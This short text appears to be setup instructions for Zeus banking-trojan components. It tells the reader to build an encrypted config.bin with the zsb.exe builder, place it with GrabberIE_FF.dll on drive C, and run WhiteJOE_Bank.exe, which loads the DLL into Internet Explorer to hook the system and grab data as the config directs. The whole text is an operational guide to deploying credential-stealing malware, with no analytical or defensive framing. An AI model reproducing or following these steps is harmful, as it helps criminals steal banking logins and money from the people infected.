Create file config.bin using zsb.exe utility (read Zeus manual)
make sure the following string is in the config.txt file
   encryption_key "secret key"
this is the password used to encrypt config.bin, the same encryption key is used inside DLL for decryption
Place config.bin and GrabberIE_FF.dll files into the root of drive C
Run WhiteJOE_Bank.exe to check if everything is working.
When IE is started, WhiteJOE_Bank.exe will load GrabberIE_FF.dll (Zeus). GrabberIE_FF.dll
will setup system hooks and load config.bin. It'll continue to operate according to settings specified.